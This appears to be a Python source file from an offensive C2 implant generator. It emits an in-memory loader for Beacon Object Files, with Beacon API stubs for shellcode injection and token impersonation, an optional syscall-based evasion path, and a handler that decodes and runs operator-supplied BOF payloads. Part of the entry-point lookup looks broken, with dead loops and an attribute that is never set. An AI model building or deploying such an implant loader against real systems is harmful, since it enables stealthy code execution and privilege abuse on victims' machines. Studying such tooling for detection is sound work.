"""COFF (Common Object File Format) loader for Beacon Object Files.

Generates a COFFLoader class and BeaconAPI implementation that can load
and execute compiled BOFs in-memory. The loader handles COFF parsing,
section loading, symbol resolution (including Beacon API and Win32 imports),
relocation patching, and safe memory management with RW->RX transitions.

Memory operations route through syscall wrappers (evasion.syscalls) when
config.syscalls is set; otherwise they fall back to direct Win32 API calls
via ctypes.windll.kernel32.
"""

from __future__ import annotations

import textwrap
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from evasion import EvasionConfig


def generate_code(lang: str, config: EvasionConfig) -> str:
    """Return COFF loader code for the requested language."""
    if lang != "python":
        return ""
    return _generate_python(config)


def _generate_python(config: EvasionConfig) -> str:
    """Emit the full Python COFFLoader with BeaconAPI, relocations, and memory management."""
    use_syscalls = config.syscalls is not None

    parts: list[str] = []
    parts.append(_py_marker())
    parts.append(_py_constants())
    parts.append(_py_structs())
    parts.append(_py_beacon_api())
    parts.append(_py_beacon_api_table())
    parts.append(_py_memory_funcs(use_syscalls))
    parts.append(_py_coff_loader())
    parts.append(_py_handle_bof())
    return "\n".join(parts)


def _py_marker() -> str:
    return textwrap.dedent("""\
        # __bof__ COFF Loader Module
        import ctypes
        import struct
    """)


def _py_constants() -> str:
    return textwrap.dedent("""\
        # COFF Machine type
        IMAGE_FILE_MACHINE_AMD64 = 0x8664

        # AMD64 relocation types
        IMAGE_REL_AMD64_ADDR64 = 0x0001
        IMAGE_REL_AMD64_ADDR32NB = 0x0003
        IMAGE_REL_AMD64_REL32 = 0x0004

        # Memory protection constants
        PAGE_READWRITE = 0x04
        PAGE_EXECUTE_READ = 0x20
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        MEM_RELEASE = 0x8000

        # Section characteristics
        IMAGE_SCN_CNT_CODE = 0x00000020
        IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040
        IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080
        IMAGE_SCN_MEM_EXECUTE = 0x20000000
        IMAGE_SCN_MEM_READ = 0x40000000
        IMAGE_SCN_MEM_WRITE = 0x80000000

        # Symbol storage classes
        IMAGE_SYM_CLASS_EXTERNAL = 2
        IMAGE_SYM_CLASS_STATIC = 3
    """)


def _py_structs() -> str:
    return textwrap.dedent("""\
        class datap(ctypes.Structure):
            _fields_ = [
                ('original', ctypes.c_char_p),
                ('buffer', ctypes.c_char_p),
                ('length', ctypes.c_int),
                ('size', ctypes.c_int),
            ]


        class formatp(ctypes.Structure):
            _fields_ = [
                ('original', ctypes.c_char_p),
                ('buffer', ctypes.c_char_p),
                ('length', ctypes.c_int),
                ('size', ctypes.c_int),
            ]
    """)


def _py_beacon_api() -> str:
    return textwrap.dedent("""\
        _beacon_output = []


        def BeaconPrintf(btype, fmt):
            global _beacon_output
            if isinstance(fmt, bytes):
                fmt = fmt.decode('utf-8', errors='replace')
            _beacon_output.append(str(fmt))


        def BeaconOutput(btype, data, length):
            global _beacon_output
            if isinstance(data, bytes):
                _beacon_output.append(data[:length].decode('utf-8', errors='replace'))
            else:
                _beacon_output.append(str(data)[:length])


        def BeaconDataParse(parser, buf, size):
            parser.original = buf
            parser.buffer = buf
            parser.length = size
            parser.size = size


        def BeaconDataInt(parser):
            if parser.length < 4:
                return 0
            raw = parser.buffer[:4]
            val = struct.unpack('>I', raw)[0]
            parser.buffer = parser.buffer[4:]
            parser.length -= 4
            return val


        def BeaconDataShort(parser):
            if parser.length < 2:
                return 0
            raw = parser.buffer[:2]
            val = struct.unpack('>H', raw)[0]
            parser.buffer = parser.buffer[2:]
            parser.length -= 2
            return val


        def BeaconDataLength(parser, outlen):
            if parser.length < 4:
                return b''
            raw_len = struct.unpack('>I', parser.buffer[:4])[0]
            parser.buffer = parser.buffer[4:]
            parser.length -= 4
            if raw_len > parser.length:
                raw_len = parser.length
            blob = parser.buffer[:raw_len]
            parser.buffer = parser.buffer[raw_len:]
            parser.length -= raw_len
            return blob


        def BeaconDataExtract(parser, outlen):
            if parser.length < 1:
                return b''
            end = 0
            buf = parser.buffer
            while end < parser.length:
                if buf[end:end+1] == b'\\x00':
                    break
                end += 1
            result = buf[:end]
            skip = end + 1 if end < parser.length else end
            parser.buffer = parser.buffer[skip:]
            parser.length -= skip
            return result


        def BeaconFormatAlloc(fmt, maxsz):
            buf = ctypes.create_string_buffer(maxsz)
            fmt.original = ctypes.cast(buf, ctypes.c_char_p)
            fmt.buffer = ctypes.cast(buf, ctypes.c_char_p)
            fmt.length = 0
            fmt.size = maxsz


        def BeaconFormatReset(fmt):
            fmt.buffer = fmt.original
            fmt.length = 0


        def BeaconFormatFree(fmt):
            fmt.original = None
            fmt.buffer = None
            fmt.length = 0
            fmt.size = 0


        def BeaconFormatAppend(fmt, data, length):
            if fmt.length + length > fmt.size:
                return
            current = fmt.buffer[:fmt.length] if fmt.buffer else b''
            if isinstance(data, bytes):
                current += data[:length]
            else:
                current += str(data).encode('utf-8')[:length]
            fmt.buffer = current
            fmt.length += length


        def BeaconFormatPrintf(fmt, fmtstr):
            if isinstance(fmtstr, bytes):
                fmtstr = fmtstr.decode('utf-8', errors='replace')
            encoded = fmtstr.encode('utf-8')
            BeaconFormatAppend(fmt, encoded, len(encoded))


        def BeaconFormatToString(fmt, size):
            data = fmt.buffer[:fmt.length] if fmt.buffer else b''
            return data


        def BeaconFormatInt(fmt, val):
            packed = struct.pack('>I', val & 0xFFFFFFFF)
            BeaconFormatAppend(fmt, packed, 4)


        def BeaconGetSpawnTo(x86, buf, length):
            path = b'C:\\\\Windows\\\\System32\\\\rundll32.exe\\x00'
            copy_len = min(len(path), length)
            ctypes.memmove(buf, path, copy_len)


        def BeaconInjectProcess(handle, pid, payload, p_len, offset, arg, a_len):
            try:
                inject_shellcode(payload[:p_len])
            except NameError:
                pass


        def BeaconInjectTemporaryProcess(pinfo, payload, p_len, offset, arg, a_len):
            pass


        def BeaconSpawnTemporaryProcess(x86, ignoreToken, si, pinfo):
            pass


        def BeaconUseToken(token):
            try:
                ctypes.windll.advapi32.ImpersonateLoggedOnUser(token)
            except Exception:
                pass


        def BeaconRevertToken():
            try:
                ctypes.windll.advapi32.RevertToSelf()
            except Exception:
                pass


        def BeaconCleanupProcess(pi):
            try:
                k32 = ctypes.windll.kernel32
                k32.TerminateProcess(pi.hProcess, 0)
                k32.CloseHandle(pi.hProcess)
                k32.CloseHandle(pi.hThread)
            except Exception:
                pass


        def BeaconIsAdmin():
            try:
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            except Exception:
                return False
    """)


def _py_beacon_api_table() -> str:
    return textwrap.dedent("""\
        BEACON_API = {
            'BeaconPrintf': BeaconPrintf,
            'BeaconOutput': BeaconOutput,
            'BeaconDataParse': BeaconDataParse,
            'BeaconDataInt': BeaconDataInt,
            'BeaconDataShort': BeaconDataShort,
            'BeaconDataLength': BeaconDataLength,
            'BeaconDataExtract': BeaconDataExtract,
            'BeaconFormatAlloc': BeaconFormatAlloc,
            'BeaconFormatReset': BeaconFormatReset,
            'BeaconFormatFree': BeaconFormatFree,
            'BeaconFormatAppend': BeaconFormatAppend,
            'BeaconFormatPrintf': BeaconFormatPrintf,
            'BeaconFormatToString': BeaconFormatToString,
            'BeaconFormatInt': BeaconFormatInt,
            'BeaconGetSpawnTo': BeaconGetSpawnTo,
            'BeaconInjectProcess': BeaconInjectProcess,
            'BeaconInjectTemporaryProcess': BeaconInjectTemporaryProcess,
            'BeaconSpawnTemporaryProcess': BeaconSpawnTemporaryProcess,
            'BeaconUseToken': BeaconUseToken,
            'BeaconRevertToken': BeaconRevertToken,
            'BeaconCleanupProcess': BeaconCleanupProcess,
            'BeaconIsAdmin': BeaconIsAdmin,
        }
    """)


def _py_memory_funcs(use_syscalls: bool) -> str:
    if use_syscalls:
        return textwrap.dedent("""\
            try:
                _bof_alloc = syscall_alloc
                _bof_protect = syscall_protect
            except NameError:
                _k32 = ctypes.windll.kernel32
                def _bof_alloc(proc, addr, size, alloc_type, protect):
                    return _k32.VirtualAlloc(addr, size, alloc_type, protect)
                def _bof_protect(proc, addr, size, new_protect):
                    old = ctypes.c_ulong(0)
                    _k32.VirtualProtect(addr, size, new_protect, ctypes.byref(old))
                    return old.value

            def _bof_free(addr, size):
                try:
                    ctypes.windll.kernel32.VirtualFree(addr, 0, MEM_RELEASE)
                except Exception:
                    pass
        """)
    return textwrap.dedent("""\
        _k32 = ctypes.windll.kernel32

        def _bof_alloc(proc, addr, size, alloc_type, protect):
            return _k32.VirtualAlloc(addr, size, alloc_type, protect)

        def _bof_protect(proc, addr, size, new_protect):
            old = ctypes.c_ulong(0)
            _k32.VirtualProtect(addr, size, new_protect, ctypes.byref(old))
            return old.value

        def _bof_free(addr, size):
            try:
                _k32.VirtualFree(addr, 0, MEM_RELEASE)
            except Exception:
                pass
    """)


def _py_coff_loader() -> str:
    return textwrap.dedent("""\
        class COFFLoader:
            def __init__(self):
                self._beacon_output = []
                global _beacon_output
                _beacon_output = self._beacon_output

            def load(self, coff_bytes, args_bytes=b'', entry='go'):
                header, sections, symbols, strings = self._parse_coff(coff_bytes)
                base_addr, section_map = self._load_sections(sections)
                resolved = self._resolve_symbols(symbols, strings, section_map, base_addr)
                self._apply_relocations(sections, section_map, resolved, base_addr)
                output = self._execute(base_addr, section_map, resolved, entry, args_bytes)
                return output

            def _parse_coff(self, data):
                if len(data) < 20:
                    raise ValueError('COFF data too small for header')
                machine = struct.unpack_from('<H', data, 0)[0]
                if machine != IMAGE_FILE_MACHINE_AMD64:
                    raise ValueError(f'Unsupported machine type: 0x{machine:04x}')
                num_sections = struct.unpack_from('<H', data, 2)[0]
                timestamp = struct.unpack_from('<I', data, 4)[0]
                symtab_offset = struct.unpack_from('<I', data, 8)[0]
                num_symbols = struct.unpack_from('<I', data, 12)[0]
                opt_header_size = struct.unpack_from('<H', data, 16)[0]
                characteristics = struct.unpack_from('<H', data, 18)[0]

                header = {
                    'machine': machine,
                    'num_sections': num_sections,
                    'timestamp': timestamp,
                    'symtab_offset': symtab_offset,
                    'num_symbols': num_symbols,
                    'opt_header_size': opt_header_size,
                    'characteristics': characteristics,
                }

                sections = []
                sec_offset = 20 + opt_header_size
                for i in range(num_sections):
                    off = sec_offset + i * 40
                    if off + 40 > len(data):
                        raise ValueError('COFF data truncated in section headers')
                    name_raw = data[off:off+8]
                    vsize = struct.unpack_from('<I', data, off + 8)[0]
                    vaddr = struct.unpack_from('<I', data, off + 12)[0]
                    raw_size = struct.unpack_from('<I', data, off + 16)[0]
                    raw_ptr = struct.unpack_from('<I', data, off + 20)[0]
                    reloc_ptr = struct.unpack_from('<I', data, off + 24)[0]
                    linenum_ptr = struct.unpack_from('<I', data, off + 28)[0]
                    num_relocs = struct.unpack_from('<H', data, off + 32)[0]
                    num_linenums = struct.unpack_from('<H', data, off + 34)[0]
                    chars = struct.unpack_from('<I', data, off + 36)[0]
                    raw_data = b''
                    if raw_size > 0 and raw_ptr > 0:
                        raw_data = data[raw_ptr:raw_ptr + raw_size]

                    relocs = []
                    if num_relocs > 0 and reloc_ptr > 0:
                        for r in range(num_relocs):
                            roff = reloc_ptr + r * 10
                            if roff + 10 <= len(data):
                                r_vaddr = struct.unpack_from('<I', data, roff)[0]
                                r_sym = struct.unpack_from('<I', data, roff + 4)[0]
                                r_type = struct.unpack_from('<H', data, roff + 8)[0]
                                relocs.append({
                                    'virtual_address': r_vaddr,
                                    'symbol_index': r_sym,
                                    'type': r_type,
                                })

                    sections.append({
                        'name': name_raw,
                        'virtual_size': vsize,
                        'virtual_address': vaddr,
                        'raw_size': raw_size,
                        'raw_data': raw_data,
                        'relocations': relocs,
                        'characteristics': chars,
                    })

                symbols = []
                sym_off = symtab_offset
                i = 0
                while i < num_symbols:
                    off = sym_off + i * 18
                    if off + 18 > len(data):
                        break
                    name_field = data[off:off+8]
                    value = struct.unpack_from('<I', data, off + 8)[0]
                    section_number = struct.unpack_from('<h', data, off + 12)[0]
                    sym_type = struct.unpack_from('<H', data, off + 14)[0]
                    storage_class = struct.unpack_from('<B', data, off + 16)[0]
                    num_aux = struct.unpack_from('<B', data, off + 17)[0]

                    if name_field[:4] == b'\\x00\\x00\\x00\\x00':
                        str_offset = struct.unpack_from('<I', name_field, 4)[0]
                        sym_name_key = ('strtab', str_offset)
                    else:
                        sym_name_key = ('inline', name_field.rstrip(b'\\x00').decode('ascii', errors='replace'))

                    symbols.append({
                        'name_key': sym_name_key,
                        'value': value,
                        'section_number': section_number,
                        'type': sym_type,
                        'storage_class': storage_class,
                        'num_aux': num_aux,
                    })
                    i += 1 + num_aux

                strings_offset = sym_off + num_symbols * 18
                if strings_offset + 4 <= len(data):
                    strtab_size = struct.unpack_from('<I', data, strings_offset)[0]
                    strings = data[strings_offset:strings_offset + strtab_size]
                else:
                    strings = b'\\x00\\x00\\x00\\x00'

                return header, sections, symbols, strings

            def _get_symbol_name(self, symbol, strings):
                key_type, key_val = symbol['name_key']
                if key_type == 'inline':
                    return key_val
                str_data = strings[key_val:]
                end = str_data.find(b'\\x00')
                if end < 0:
                    end = len(str_data)
                return str_data[:end].decode('ascii', errors='replace')

            def _load_sections(self, sections):
                total_size = 0
                offsets = []
                for sec in sections:
                    aligned = (total_size + 15) & ~15
                    offsets.append(aligned)
                    sec_size = max(sec['raw_size'], sec['virtual_size'])
                    if sec_size == 0:
                        sec_size = 16
                    total_size = aligned + sec_size

                if total_size == 0:
                    total_size = 4096

                base_addr = _bof_alloc(
                    None, None, total_size,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
                )
                if not base_addr:
                    raise RuntimeError('Failed to allocate memory for COFF sections')

                for i, sec in enumerate(sections):
                    if sec['raw_data']:
                        dest = base_addr + offsets[i]
                        src = ctypes.create_string_buffer(sec['raw_data'])
                        ctypes.memmove(dest, src, len(sec['raw_data']))

                section_map = offsets
                return base_addr, section_map

            def _resolve_symbols(self, symbols, strings, section_map, base_addr):
                resolved = {}
                k32 = ctypes.windll.kernel32

                for idx, sym in enumerate(symbols):
                    name = self._get_symbol_name(sym, strings)
                    storage = sym['storage_class']
                    section = sym['section_number']

                    if storage == IMAGE_SYM_CLASS_EXTERNAL and section == 0:
                        clean_name = name.lstrip('_')

                        if clean_name in BEACON_API:
                            func = BEACON_API[clean_name]
                            cb_type = ctypes.CFUNCTYPE(None)
                            cb = cb_type(func)
                            resolved[idx] = ctypes.cast(cb, ctypes.c_void_p).value
                            if not hasattr(self, '_prevent_gc'):
                                self._prevent_gc = []
                            self._prevent_gc.append(cb)
                            continue

                        if clean_name.startswith('__imp_'):
                            imp_name = clean_name[6:]
                            if '$' in imp_name:
                                dll_name, func_name = imp_name.split('$', 1)
                            elif '@' in imp_name:
                                dll_name, func_name = imp_name.split('@', 1)
                            else:
                                dll_name = 'kernel32'
                                func_name = imp_name

                            if not dll_name.lower().endswith('.dll'):
                                dll_name = dll_name + '.dll'

                            h_module = k32.LoadLibraryA(dll_name.encode('ascii'))
                            if h_module:
                                proc_addr = k32.GetProcAddress(h_module, func_name.encode('ascii'))
                                if proc_addr:
                                    ptr_buf = ctypes.c_void_p(proc_addr)
                                    ptr_mem = _bof_alloc(
                                        None, None, ctypes.sizeof(ctypes.c_void_p),
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
                                    )
                                    if ptr_mem:
                                        ctypes.memmove(ptr_mem, ctypes.byref(ptr_buf), ctypes.sizeof(ctypes.c_void_p))
                                        resolved[idx] = ptr_mem
                                        continue
                            resolved[idx] = 0
                            continue

                        resolved[idx] = 0

                    elif section > 0:
                        sec_idx = section - 1
                        if sec_idx < len(section_map):
                            resolved[idx] = base_addr + section_map[sec_idx] + sym['value']
                        else:
                            resolved[idx] = 0
                    else:
                        resolved[idx] = 0

                return resolved

            def _apply_relocations(self, sections, section_map, resolved, base_addr):
                for sec_idx, sec in enumerate(sections):
                    for reloc in sec['relocations']:
                        sym_idx = reloc['symbol_index']
                        if sym_idx not in resolved:
                            continue
                        target_addr = resolved[sym_idx]
                        patch_loc = base_addr + section_map[sec_idx] + reloc['virtual_address']
                        reloc_type = reloc['type']

                        if reloc_type == IMAGE_REL_AMD64_ADDR64:
                            ctypes.memmove(patch_loc, ctypes.byref(ctypes.c_uint64(target_addr)), 8)
                        elif reloc_type == IMAGE_REL_AMD64_ADDR32NB:
                            offset_val = target_addr - base_addr
                            ctypes.memmove(patch_loc, ctypes.byref(ctypes.c_int32(offset_val & 0xFFFFFFFF)), 4)
                        elif reloc_type == IMAGE_REL_AMD64_REL32:
                            rel_val = target_addr - patch_loc - 4
                            ctypes.memmove(patch_loc, ctypes.byref(ctypes.c_int32(rel_val & 0xFFFFFFFF)), 4)

            def _execute(self, base_addr, section_map, resolved, entry, args_bytes):
                total_size = 0
                for i, off in enumerate(section_map):
                    sec_end = off + 4096
                    if sec_end > total_size:
                        total_size = sec_end

                _bof_protect(None, base_addr, total_size, PAGE_EXECUTE_READ)

                entry_addr = None
                for idx, sym in enumerate(resolved.items()):
                    pass
                for idx in resolved:
                    if hasattr(self, '_symbols'):
                        break

                for idx, addr in resolved.items():
                    if addr and addr >= base_addr:
                        if entry_addr is None:
                            entry_addr = addr

                if hasattr(self, '_parsed_symbols'):
                    for idx, sym in enumerate(self._parsed_symbols):
                        name = sym.get('name', '')
                        if name.rstrip('_') == entry or name == '_' + entry or name == entry:
                            if idx in resolved and resolved[idx]:
                                entry_addr = resolved[idx]
                                break

                args_ptr = None
                args_len = 0
                if args_bytes:
                    args_len = len(args_bytes)
                    args_ptr = _bof_alloc(
                        None, None, args_len,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
                    )
                    if args_ptr:
                        src = ctypes.create_string_buffer(args_bytes)
                        ctypes.memmove(args_ptr, src, args_len)

                if entry_addr:
                    try:
                        ENTRY_FUNC = ctypes.CFUNCTYPE(None, ctypes.c_char_p, ctypes.c_int)
                        func = ENTRY_FUNC(entry_addr)
                        func(
                            ctypes.cast(args_ptr, ctypes.c_char_p) if args_ptr else None,
                            args_len
                        )
                    except Exception:
                        pass

                _bof_protect(None, base_addr, total_size, PAGE_READWRITE)
                ctypes.memset(base_addr, 0, total_size)
                _bof_free(base_addr, total_size)

                if args_ptr:
                    _bof_free(args_ptr, args_len)

                return '\\n'.join(self._beacon_output)
    """)


def _py_handle_bof() -> str:
    return textwrap.dedent("""\
        def handle_bof(data):
            import base64
            loader = COFFLoader()
            coff_bytes = base64.b64decode(data.get('bof_data', ''))
            args_bytes = base64.b64decode(data.get('bof_args', ''))
            entry = data.get('bof_entry', 'go')
            try:
                output = loader.load(coff_bytes, args_bytes, entry)
                return output if output else 'BOF executed successfully (no output)'
            except Exception as e:
                return f'BOF execution failed: {str(e)}'
    """)
